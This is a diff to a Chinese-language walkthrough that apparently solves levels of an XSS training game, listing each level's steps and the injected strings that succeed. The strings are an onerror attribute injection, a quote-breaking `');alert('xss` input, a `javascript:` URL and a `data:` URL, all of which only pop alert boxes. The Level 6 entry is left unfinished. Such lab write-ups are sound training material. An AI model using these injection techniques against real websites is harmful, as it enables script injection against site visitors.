@@ -25,8 +25,20 @@
 5. 測試 `#' onerror=alert('') />` (成功)
 6. 結束
 
-## LEVEL 4 (DOM-based XSS)
+## LEVEL 4
 
 1. 輸入 `xss`
 2. 檢視原始碼 `<img src="/static/loading.gif" onload="startTimer('x');" />`
 3. 輸入 `');alert('xss`
+4. 結束
+
+## LEVEL 5 
+
+1. 點選 Sign Up
+2. 檢視 `Next >>` 的原始碼 `<a href="confirm">Next >></a>`
+3. next=javascript:alert('xss') 點選 Next >>
+
+## LEVEL 6
+
+1. 
+2. #data:text/plain,alert('xss')
